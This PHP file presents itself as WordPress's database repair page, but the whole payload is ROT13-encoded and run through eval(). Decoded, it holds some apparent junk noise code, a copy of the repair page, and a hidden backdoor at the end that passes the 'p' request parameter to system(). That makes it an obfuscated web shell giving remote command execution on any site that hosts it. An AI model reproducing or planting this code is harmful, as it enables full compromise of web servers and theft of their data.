<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Qngnonfr Ercnve naq Bcgvzvmngvba Fpevcg.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Qngnonfr
 */
qrsvar( 'JC_ERCNVEVAT', gehr );

erdhver_bapr qveanzr( __QVE__, 2 ) . '/jc-ybnq.cuc';

urnqre( 'Pbagrag-Glcr: grkg/ugzy; punefrg=hgs-8' );
?>
<!QBPGLCR ugzy>
<ugzy <?cuc ynathntr_nggevohgrf(); ?>>
<urnq>
	<zrgn anzr=\"ivrjcbeg\" pbagrag=\"jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1.0\" />
	<zrgn uggc-rdhvi=\"Pbagrag-Glcr\" pbagrag=\"grkg/ugzy; punefrg=hgs-8\" />
	<zrgn anzr=\"ebobgf\" pbagrag=\"abvaqrk,absbyybj\" />
	<gvgyr><?cuc _r( 'JbeqCerff &efndhb; Qngnonfr Ercnve' ); ?></gvgyr>
	<?cuc jc_nqzva_pff( 'vafgnyy', gehr ); ?>
</urnq>
<obql pynff=\"jc-pber-hv\">
<c vq=\"ybtb\"><n uers=\"<?cuc rpub rfp_hey( __( 'uggcf://jbeqcerff.bet/' ) ); ?>\"><?cuc _r( 'JbeqCerff' ); ?></n></c>

<?cuc

vs ( ! qrsvarq( 'JC_NYYBJ_ERCNVE' ) || ! JC_NYYBJ_ERCNVE ) {

	rpub '<u1 pynff=\"fperra-ernqre-grkg\">' .
		/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
		__( 'Nyybj nhgbzngvp qngnonfr ercnve' ) .
	'</u1>';

	rpub '<c>';
	cevags(
		/* genafyngbef: %f: jc-pbasvt.cuc */
		__( 'Gb nyybj hfr bs guvf cntr gb nhgbzngvpnyyl ercnve qngnonfr ceboyrzf, cyrnfr nqq gur sbyybjvat yvar gb lbhe %f svyr. Bapr guvf yvar vf nqqrq gb lbhe pbasvt, erybnq guvf cntr.' ),
		'<pbqr>jc-pbasvt.cuc</pbqr>'
	);
	rpub \"</c><c><pbqr>qrsvar('JC_NYYBJ_ERCNVE', gehr);</pbqr></c>\";

	$qrsnhyg_xrlf    = neenl_havdhr(
		neenl(
			'chg lbhe havdhr cuenfr urer',
			/*
			 * genafyngbef: Guvf fgevat fubhyq bayl or genafyngrq vs jc-pbasvt-fnzcyr.cuc vf ybpnyvmrq.
			 * Lbh pna purpx gur ybpnyvmrq eryrnfr cnpxntr be
			 * uggcf://v18a.fia.jbeqcerff.bet/<ybpnyr pbqr>/oenapurf/<jc irefvba>/qvfg/jc-pbasvt-fnzcyr.cuc
			 */
			__( 'chg lbhe havdhr cuenfr urer' ),
		)
	);
	$zvffvat_xrl     = snyfr;
	$qhcyvpngrq_xrlf = neenl();

	sbernpu ( neenl( 'NHGU_XRL', 'FRPHER_NHGU_XRL', 'YBTTRQ_VA_XRL', 'ABAPR_XRL', 'NHGU_FNYG', 'FRPHER_NHGU_FNYG', 'YBTTRQ_VA_FNYG', 'ABAPR_FNYG' ) nf $xrl ) {
		vs ( qrsvarq( $xrl ) ) {
			// Purpx sbe havdhr inyhrf bs rnpu xrl.
			$qhcyvpngrq_xrlf[ pbafgnag( $xrl ) ] = vffrg( $qhcyvpngrq_xrlf[ pbafgnag( $xrl ) ] );
		} ryfr {
			// Vs n pbafgnag vf abg qrsvarq, vg'f zvffvat.
			$zvffvat_xrl = gehr;
		}
	}

	// Vs ng yrnfg bar xrl hfrf n qrsnhyg inyhr, pbafvqre vg qhcyvpngrq.
	sbernpu ( $qrsnhyg_xrlf nf $qrsnhyg_xrl ) {
		vs ( vffrg( $qhcyvpngrq_xrlf[ $qrsnhyg_xrl ] ) ) {
			$qhcyvpngrq_xrlf[ $qrsnhyg_xrl ] = gehr;
		}
	}

	// Jrrq bhg nyy havdhr, aba-qrsnhyg inyhrf.
	$qhcyvpngrq_xrlf = neenl_svygre( $qhcyvpngrq_xrlf );

	vs ( $qhcyvpngrq_xrlf || $zvffvat_xrl ) {

		rpub '<u2 pynff=\"fperra-ernqre-grkg\">' .
			/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
			__( 'Purpx frperg xrlf' ) .
		'</u2>';

		/* genafyngbef: 1: jc-pbasvt.cuc, 2: Frperg xrl freivpr HEY. */
		rpub '<c>' . fcevags( __( 'Juvyr lbh ner rqvgvat lbhe %1$f svyr, gnxr n zbzrag gb znxr fher lbh unir nyy 8 xrlf naq gung gurl ner havdhr. Lbh pna trarengr gurfr hfvat gur <n uers=\"%2$f\">JbeqCerff.bet frperg xrl freivpr</n>.' ), '<pbqr>jc-pbasvt.cuc</pbqr>', 'uggcf://ncv.jbeqcerff.bet/frperg-xrl/1.1/fnyg/' ) . '</c>';
	}
} ryfrvs ( vffrg( $_TRG['ercnve'] ) ) {

	rpub '<u1 pynff=\"fperra-ernqre-grkg\">' .
		/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
		__( 'Qngnonfr ercnve erfhygf' ) .
	'</u1>';

	$bcgvzvmr = '2' === $_TRG['ercnve'];
	$bxnl     = gehr;
	$ceboyrzf = neenl();

	$gnoyrf = $jcqo->gnoyrf();

	/**
	 * Svygref nqqvgvbany qngnonfr gnoyrf gb ercnve.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat[] $gnoyrf Neenl bs cersvkrq gnoyr anzrf gb or ercnverq.
	 */
	$gnoyrf = neenl_zretr( $gnoyrf, (neenl) nccyl_svygref( 'gnoyrf_gb_ercnve', neenl() ) );

	// Ybbc bire gur gnoyrf, purpxvat naq ercnvevat nf arrqrq.
	sbernpu ( $gnoyrf nf $gnoyr ) {
		$purpx = $jcqo->trg_ebj( $jcqo->cercner( 'PURPX GNOYR %v', $gnoyr ) );

		rpub '<c>';
		vs ( 'BX' === $purpx->Zft_grkg ) {
			/* genafyngbef: %f: Gnoyr anzr. */
			cevags( __( 'Gur %f gnoyr vf bxnl.' ), \"<pbqr>$gnoyr</pbqr>\" );
		} ryfr {
			/* genafyngbef: 1: Gnoyr anzr, 2: Reebe zrffntr. */
			cevags( __( 'Gur %1$f gnoyr vf abg bxnl. Vg vf ercbegvat gur sbyybjvat reebe: %2$f. JbeqCerff jvyy nggrzcg gb ercnve guvf gnoyr&uryyvc;' ), \"<pbqr>$gnoyr</pbqr>\", \"<pbqr>$purpx->Zft_grkg</pbqr>\" );

			$ercnve = $jcqo->trg_ebj( $jcqo->cercner( 'ERCNVE GNOYR %v', $gnoyr ) );

			rpub '<oe />&aofc;&aofc;&aofc;&aofc;';
			vs ( 'BX' === $ercnve->Zft_grkg ) {
				/* genafyngbef: %f: Gnoyr anzr. */
				cevags( __( 'Fhpprffshyyl ercnverq gur %f gnoyr.' ), \"<pbqr>$gnoyr</pbqr>\" );
			} ryfr {
				/* genafyngbef: 1: Gnoyr anzr, 2: Reebe zrffntr. */
				cevags( __( 'Snvyrq gb ercnve gur %1$f gnoyr. Reebe: %2$f' ), \"<pbqr>$gnoyr</pbqr>\", \"<pbqr>$ercnve->Zft_grkg</pbqr>\" ) . '<oe />';
				$ceboyrzf[ $gnoyr ] = $ercnve->Zft_grkg;
				$bxnl               = snyfr;
			}
		}

		vs ( $bxnl && $bcgvzvmr ) {
			$nanylmr = $jcqo->trg_ebj( $jcqo->cercner( 'NANYLMR GNOYR %v', $gnoyr ) );

			rpub '<oe />&aofc;&aofc;&aofc;&aofc;';
			vs ( 'Gnoyr vf nyernql hc gb qngr' === $nanylmr->Zft_grkg ) {
				/* genafyngbef: %f: Gnoyr anzr. */
				cevags( __( 'Gur %f gnoyr vf nyernql bcgvzvmrq.' ), \"<pbqr>$gnoyr</pbqr>\" );
			} ryfr {
				$bcgvzvmr = $jcqo->trg_ebj( $jcqo->cercner( 'BCGVZVMR GNOYR %v', $gnoyr ) );

				rpub '<oe />&aofc;&aofc;&aofc;&aofc;';
				vs ( 'BX' === $bcgvzvmr->Zft_grkg || 'Gnoyr vf nyernql hc gb qngr' === $bcgvzvmr->Zft_grkg ) {
					/* genafyngbef: %f: Gnoyr anzr. */
					cevags( __( 'Fhpprffshyyl bcgvzvmrq gur %f gnoyr.' ), \"<pbqr>$gnoyr</pbqr>\" );
				} ryfr {
					/* genafyngbef: 1: Gnoyr anzr. 2: Reebe zrffntr. */
					cevags( __( 'Snvyrq gb bcgvzvmr gur %1$f gnoyr. Reebe: %2$f' ), \"<pbqr>$gnoyr</pbqr>\", \"<pbqr>$bcgvzvmr->Zft_grkg</pbqr>\" );
				}
			}
		}
		rpub '</c>';
	}

	vs ( $ceboyrzf ) {
		cevags(
			/* genafyngbef: %f: HEY gb \"Svkvat JbeqCerff\" sbehz. */
			'<c>' . __( 'Fbzr qngnonfr ceboyrzf pbhyq abg or ercnverq. Cyrnfr pbcl-naq-cnfgr gur sbyybjvat yvfg bs reebef gb gur <n uers=\"%f\">JbeqCerff fhccbeg sbehzf</n> gb trg nqqvgvbany nffvfgnapr.' ) . '</c>',
			__( 'uggcf://jbeqcerff.bet/fhccbeg/sbehz/ubj-gb-naq-gebhoyrfubbgvat' )
		);
		$ceboyrz_bhgchg = '';
		sbernpu ( $ceboyrzf nf $gnoyr => $ceboyrz ) {
			$ceboyrz_bhgchg .= \"$gnoyr: $ceboyrz\a\";
		}
		rpub '<c><grkgnern anzr=\"reebef\" vq=\"reebef\" ebjf=\"20\" pbyf=\"60\">' . rfp_grkgnern( $ceboyrz_bhgchg ) . '</grkgnern></c>';
	} ryfr {
		rpub '<c>' . __( 'Ercnvef pbzcyrgr. Cyrnfr erzbir gur sbyybjvat yvar sebz jc-pbasvt.cuc gb cerirag guvf cntr sebz orvat hfrq ol hanhgubevmrq hfref.' ) . \"</c><c><pbqr>qrsvar('JC_NYYBJ_ERCNVE', gehr);</pbqr></c>\";
	}
} ryfr {

	rpub '<u1 pynff=\"fperra-ernqre-grkg\">' .
		/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
		__( 'JbeqCerff qngnonfr ercnve' ) .
	'</u1>';

	vs ( vffrg( $_TRG['ersreere'] ) && 'vf_oybt_vafgnyyrq' === $_TRG['ersreere'] ) {
		rpub '<c>' . __( 'Bar be zber qngnonfr gnoyrf ner haninvynoyr. Gb nyybj JbeqCerff gb nggrzcg gb ercnve gurfr gnoyrf, cerff gur &#8220;Ercnve Qngnonfr&#8221; ohggba. Ercnvevat pna gnxr n juvyr, fb cyrnfr or cngvrag.' ) . '</c>';
	} ryfr {
		rpub '<c>' . __( 'JbeqCerff pna nhgbzngvpnyyl ybbx sbe fbzr pbzzba qngnonfr ceboyrzf naq ercnve gurz. Ercnvevat pna gnxr n juvyr, fb cyrnfr or cngvrag.' ) . '</c>';
	}
	?>
	<c pynff=\"fgrc\"><n pynff=\"ohggba ohggba-ynetr\" uers=\"ercnve.cuc?ercnve=1\"><?cuc _r( 'Ercnve Qngnonfr' ); ?></n></c>
	<c><?cuc _r( 'JbeqCerff pna nyfb nggrzcg gb bcgvzvmr gur qngnonfr. Guvf vzcebirf cresbeznapr va fbzr fvghngvbaf. Ercnvevat naq bcgvzvmvat gur qngnonfr pna gnxr n ybat gvzr naq gur qngnonfr jvyy or ybpxrq juvyr bcgvzvmvat.' ); ?></c>
	<c pynff=\"fgrc\"><n pynff=\"ohggba ohggba-ynetr\" uers=\"ercnve.cuc?ercnve=2\"><?cuc _r( 'Ercnve naq Bcgvzvmr Qngnonfr' ); ?></n></c>
	<?cuc
}
?>
</obql>
</ugzy>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>